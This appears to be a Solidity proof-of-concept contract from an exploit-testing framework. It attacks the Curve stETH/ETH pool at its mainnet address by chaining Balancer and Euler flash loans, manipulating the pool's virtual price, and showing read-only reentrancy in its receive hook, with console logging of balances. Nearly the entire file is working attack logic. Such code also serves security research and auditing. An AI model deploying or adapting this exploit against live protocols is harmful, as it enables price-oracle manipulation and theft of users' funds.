pragma solidity ^0.8.0;

import "../PriceManipulation.sol";
import "../../tokens/Tokens.sol";
import "../../flashloan/FlashLoan.sol";

import "../lib/CurvePriceManipulation.sol";

import "forge-std/console.sol";
import "forge-std/Test.sol";

contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
    using FlashLoanProvider for FlashLoanProviders;
    using PriceManipulationProvider for PriceManipulationProviders;

    function initiateAttack() external override {
        console.log("---------------------------------------------------------------------------");
        console.log("Curve Virtual Price BEFORE:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
        // Deal ether to cover fees and losses
        deal(EthereumTokens.NATIVE_ASSET, address(this), 4 ether);
        takeFlashLoan(FlashLoanProviders.BALANCER, EthereumTokens.WETH, 50000e18);

    }
    function _executeAttack() internal override(PriceManipulation, FlashLoan) {
        if (currentFlashLoanProvider() == FlashLoanProviders.EULER) {
            // Unwrap flash loaned wstETH to manipulate Curve pool
            console.log("---------------------------------------------------------------------------");
            IWrapped(address(EthereumTokens.wstETH)).unwrap(50000e18);
            console.log("ETH   :", address(this).balance);
            console.log("WETH :", EthereumTokens.WETH.balanceOf(address(this)));
            console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));

            manipulatePrice(PriceManipulationProviders.CURVE, EthereumTokens.ETH, EthereumTokens.stETH, 50000e18, 50000e18);
            
            console.log("---------------------------------------------------------------------------");
            console.log("PAY BACK stETH");
            console.log("ETH   :", address(this).balance);
            console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
            // Wrap stETH to pay back flash loan
            EthereumTokens.stETH.approve(address(EthereumTokens.wstETH), type(uint256).max);
            IWrapped(address(EthereumTokens.wstETH)).wrap(EthereumTokens.stETH.balanceOf(address(this)));
        } else if (currentFlashLoanProvider() == FlashLoanProviders.BALANCER) {
            // Unwrap ether to use in price manipulation
            IWrappedEther(address(EthereumTokens.WETH)).withdraw(50000e18);

            // Borrow wstETH
            takeFlashLoan(FlashLoanProviders.EULER, EthereumTokens.wstETH, 50000e18);

            // Unrawp wstETH and swap stETH to Ether to pay back balancer loan
            IWrapped(address(EthereumTokens.wstETH)).unwrap(EthereumTokens.wstETH.balanceOf(address(this)));
            ICurvePool curvePool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
            EthereumTokens.stETH.approve(address(curvePool), type(uint256).max);
            curvePool.exchange(1, 0, EthereumTokens.stETH.balanceOf(address(this)), 0);

            // Wrap Ether to pay back balancer loan
            IWrappedEther(address(EthereumTokens.WETH)).deposit{value: address(this).balance}();
            console.log("---------------------------------------------------------------------------");
            console.log("PAY BACK WETH");
            console.log("ETH   :", address(this).balance);
            console.log("WETH  :", EthereumTokens.WETH.balanceOf(address(this)));
            console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
            console.log("wstETH:", EthereumTokens.wstETH.balanceOf(address(this)));
        }
    }

    function _completeAttack() internal override(PriceManipulation, FlashLoan) {
        console.log("---------------------------------------------------------------------------");
        console.log("Curve Virtual Price AFTER:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
        console.log("ETH   :", address(this).balance);
        console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
        console.log("wstETH:", EthereumTokens.wstETH.balanceOf(address(this)));
    }

    receive() external payable override {
        // console.log(uint256(currentPriceOracleProvider()));
        // console.log(currentPriceOracleProvider() == PriceManipulationProviders.CURVE);
        if (currentPriceOracleProvider() == PriceManipulationProviders.CURVE) {
            // Execute read only reentrancy
            // Caller should be curve pool
            console.log("---------------------------------------------------------------------------");
            console.log("Curve Virtual Price DURING:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
            console.log("ETH   :", address(this).balance);
            console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
        }
    }

    fallback() external payable override(FlashLoan, Reentrancy) {
        FlashLoan._fallback();
    }
}

interface IPool {
    function get_virtual_price() external view returns (uint256);
}

interface IWrapped {
    function wrap(uint256) external;
    function unwrap(uint256) external;
}
interface IWrappedEther {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface UniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}